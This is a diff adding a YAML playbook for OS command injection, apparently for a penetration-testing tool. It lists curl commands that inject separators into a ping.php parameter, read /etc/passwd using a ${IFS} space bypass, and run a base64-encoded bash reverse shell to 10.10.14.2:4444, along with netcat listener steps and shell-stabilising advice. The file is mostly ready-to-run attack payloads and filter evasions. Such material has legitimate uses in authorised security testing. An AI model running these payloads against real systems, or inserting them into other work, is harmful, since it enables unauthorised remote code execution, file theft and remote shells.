@@ -1,0 +1,61 @@
+id: command-injection
+name: OS Command Injection & Filter Bypasses
+category: web
+description: Methodology for Command Injection vulnerabilities. Covers command separators (; && |), space filter bypasses (${IFS}), base64 encoding execution, and out-of-band exfiltration.
+port_triggers:
+  - 80
+  - 443
+  - 8000
+  - 8080
+  - 8443
+  - 8978
+service_triggers:
+  - http
+  - https
+  - web
+tags:
+  - command-injection
+  - rce
+  - bypasses
+  - web
+steps:
+  - id: cmd-separator-test
+    title: Command Separator Discovery (; | && || `)
+    phase: exploitation
+    purpose: Test command delimiters to break out of expected input and execute operating system commands.
+    command: curl -s "{{TARGET_URL}}/ping.php?ip=127.0.0.1%3Bid"
+    expected_output:
+      - PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+      - uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    common_mistakes:
+      - 'Not URL-encoding delimiters: `;` is `%3B`, `&` is `%26`, `|` is `%7C`, space is `%20` or `+`.'
+    if_success: Direct command injection confirmed! Proceed to reverse shell execution.
+    if_failure: Input sanitized. Test space bypasses with `${IFS}`.
+    references:
+      - https://portswigger.net/web-security/os-command-injection
+  - id: cmd-space-bypass
+    title: Space Filter Bypass via ${IFS}
+    phase: exploitation
+    purpose: Bypass input filters stripping spaces using the Linux Internal Field Separator `${IFS}` variable.
+    command: curl -s "{{TARGET_URL}}/ping.php?ip=127.0.0.1%3Bcat${IFS}/etc/passwd"
+    expected_output:
+      - root:x:0:0:root:/root:/bin/bash
+    common_mistakes:
+      - On Windows machines, use `%ProgramFiles:~10,1%` or redirection operators (`type<file.txt`) instead of `${IFS}`.
+    if_success: Space filter bypassed! Use `${IFS}` to structure reverse shell payload.
+    if_failure: Character filter active. Use Base64 pipe execution.
+    references:
+      - https://portswigger.net/web-security/os-command-injection
+  - id: cmd-base64-exec
+    title: Base64 Encoded Payload Execution
+    phase: exploitation
+    purpose: Bypass all character filters by encoding the entire reverse shell string into Base64 and piping it to bash.
+    command: curl -s "{{TARGET_URL}}/ping.php?ip=127.0.0.1%3Becho${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzQ0NDQgMD4mMQ==|base64${IFS}-d|bash"
+    expected_output:
+      - '[Kali Listener: nc -lvnp 4444 -> Connection received from {{TARGET}}]'
+    common_mistakes:
+      - 'Starting command before launching your netcat listener: `nc -lvnp 4444`.'
+    if_success: Interactive reverse shell received on Kali! Stabilize TTY shell.
+    if_failure: Outbound TCP connection blocked. Try HTTP/DNS out-of-band reverse shell.
+    references:
+      - https://portswigger.net/web-security/os-command-injection
